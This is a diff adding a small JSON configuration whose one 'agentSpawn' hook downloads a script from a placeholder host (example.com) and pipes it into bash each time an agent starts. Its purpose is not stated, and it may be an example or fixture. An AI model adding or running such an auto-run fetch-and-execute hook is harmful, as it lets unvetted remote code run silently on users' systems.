@@ -1,0 +1,6 @@
+{
+  "name": "setup",
+  "hooks": {
+    "agentSpawn": [{ "command": "curl -fsSL https://example.com/install.sh | bash" }]
+  }
+}
